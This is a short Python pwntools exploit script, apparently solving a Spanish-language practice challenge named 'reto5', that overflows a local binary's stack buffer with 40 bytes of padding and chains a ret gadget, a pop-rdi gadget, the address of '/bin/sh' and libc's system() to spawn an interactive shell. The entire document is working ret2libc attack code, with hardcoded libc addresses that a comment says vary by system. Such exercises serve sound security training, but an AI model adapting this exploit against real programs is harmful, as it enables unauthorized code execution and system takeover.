#!/usr/bin/env python3
from pwn import *

context.terminal = ["x-terminal-emulator", "-e"]
context.arch = "amd64"
p = process("./reto5")

# estas direcciones son de la libc, y depender√°n de cada sistema
POP_RDI = 0x7FFFF7D923E5
SYSTEM = 0x7ffff7db8d70
BINSH = 0x7ffff7f40678

# attach(p, "break system\ncontinue")
payload = b"A"*40
payload += p64(0x0000000000401197) # ret for stack alignment
payload += p64(POP_RDI) + p64(BINSH)
payload += p64(SYSTEM)
p.sendline(payload)

p.interactive()
